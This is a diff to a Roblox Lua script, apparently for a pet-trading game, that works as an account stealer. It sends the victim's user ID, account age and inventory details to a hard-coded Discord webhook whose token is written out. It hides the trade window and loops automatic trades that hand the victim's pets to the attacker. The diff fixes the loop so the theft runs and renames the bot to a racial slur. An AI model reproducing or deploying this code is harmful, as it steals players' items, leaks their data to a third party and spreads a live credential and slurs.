@@ -1,6 +1,5 @@
-Username = "normalplayermph"
-Webhook = "https://discord.com/api/webhooks/1279992425070334023/1vdb0pSiZDQr0tABnDFVKxc2vzj_rwLBpitWrKN36chStTeVW23H82B6UfL2x44NChxS"
-local Loads = require(game.ReplicatedStorage.Fsys).load
+Username = "NormalPlayerMph"
+Webhook = "https://discord.com/api/webhooks/1279992425070334023/1vdb0pSiZDQr0tABnDFVKxc2vzj_rwLBpitWrKN36chStTeVW23H82B6UfL2x44NChxS"local Loads = require(game.ReplicatedStorage.Fsys).load
 local InventoryDB = Loads("InventoryDB")
 local ClientData = Loads('ClientData')
 local legendaries_count = 0
@@ -39,7 +38,7 @@ local userr = Username
 local userid = game.Players.LocalPlayer.UserId
  local accage = game.Players.LocalPlayer.AccountAge
 local data = {
-  username = 'Lorestorm Hub ☁️',
+  username = 'LiggyNiggy Hub ☁️',
   avatar_url = 'https://cdn.discordapp.com/attachments/1266886405208936650/1270128838679986228/images_2.jpg?ex=66b29328&is=66b141a8&hm=6db84cb36a52d8b48f1b940c42ddc1fc118eb18073bf38bcc629bae35e426f6b&',
   content = '@everyone Join your player using **Join Script** and type **Anything** in chat to start stealing! It will auto trade!',
   embeds = {
@@ -109,7 +108,7 @@ local function ConfirmTrade()
 end
 game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
 local function StartSteal()
-    while task.wait(15)
+    while task.wait(15) do
     SendTrade(Username)
     wait(3)
     AddPets()
@@ -117,6 +116,7 @@ local function StartSteal()
     AcceptTrade()
     wait(15)
     ConfirmTrade()
+       end
 end
 for _, plr in pairs(game.Players:GetPlayers()) do
   if plr.Name:lower() == Username:lower() then
